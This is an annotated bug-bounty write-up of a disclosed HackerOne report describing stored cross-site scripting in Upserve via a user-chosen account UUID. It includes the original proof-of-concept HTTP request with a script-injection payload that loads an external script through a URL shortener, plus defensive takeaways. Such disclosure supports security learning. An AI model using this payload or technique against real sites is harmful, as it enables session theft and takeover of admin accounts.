# Ability to create own account UUID leads to stored XSS

## Metadata
- **Source:** HackerOne
- **Report:** 249131 | https://hackerone.com/reports/249131
- **Submitted:** 2017-07-13
- **Reporter:** cache-money
- **Program:** Upserve
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The application allows users to set custom UUID values during account creation with only character length restrictions, enabling injection of malicious script tags. The attacker can embed external scripts via URL shorteners to bypass length limits, and the injected payload executes in admin panels and other areas where the UUID is displayed without proper sanitization.

## Attack scenario
1. Attacker crafts a malicious script tag with external script source shortened to fit length restrictions (e.g., //is.gd/z0i2sU)
2. Attacker sends POST request to /c/user endpoint with injected UUID containing </script><script src=//shortened_url>
3. Application accepts the UUID without validating character whitelist, only checking length
4. Malicious UUID is stored in database and embedded in HTML/JavaScript context as consumer object property
5. When UUID is displayed in admin panels or user-facing pages, the injected script tag breaks out of JavaScript string context and loads external script
6. Attacker's malicious script executes with privileges of the viewing user, potentially stealing session tokens or performing admin actions

## Root cause
Combination of two security failures: (1) Input validation only checks character length without restricting to alphanumeric/UUID format characters, and (2) Output encoding is missing when UUID is embedded directly into JavaScript context without escaping special characters like quotes and angle brackets

## Attacker mindset
The attacker demonstrates sophisticated understanding by: using URL shorteners to compress payload within length limits, exploiting implicit script tag closing at end of line to avoid needing closing tag, targeting UUID fields which are unlikely to be sanitized due to assumption they contain only harmless identifiers, and creating full PoC rather than trivial alert() to demonstrate real impact on admin functionality

## Defensive takeaways
- Implement strict input validation: accept only valid UUID format (alphanumeric and hyphens matching UUID regex pattern)
- Apply context-appropriate output encoding when embedding user data in JavaScript: escape <, >, quotes, and other special characters
- Use Content Security Policy (CSP) to restrict script sources and prevent inline script execution
- Sanitize all user-controllable data before embedding in HTML/JavaScript contexts, regardless of field semantics
- Apply principle of least privilege to UUID fields - validate format server-side before storage
- Regular security testing of admin panels and internal tools where data displays may lack same scrutiny as public-facing pages

## Variant hunting
Search for other user-modifiable identifier fields (username, display name, account_id) that may be embedded in JavaScript contexts; investigate POST/PUT endpoints accepting object properties for similar injection points; examine template rendering for cases where user data is embedded without encoding; test admin dashboards and analytics tools that display user information; look for similar patterns in related reports (#246806 mentioned as similar vulnerability)

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1083: File and Directory Discovery
- T1566: Phishing

## Notes
Reporter demonstrates strong security research practices by comparing to related CVE (#246806), noting broader impact scope (admin panels), and providing complete attack scenario with working PoC. The vulnerability's criticality stems from execution context in administrative tools rather than just user profiles. URL shortening bypass of length restriction is a notable evasion technique. The implicit script tag closure indicates shallow HTML/JavaScript parsing on attacker side.

## Full report
<details><summary>Expand</summary>

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.

This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

**PoC**
Just replace the email with the one you own, and click the email confirmation link.
```
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,`

Thanks,
-- Tanner

</details>

---
*Analysed by Claude on 2026-05-12*
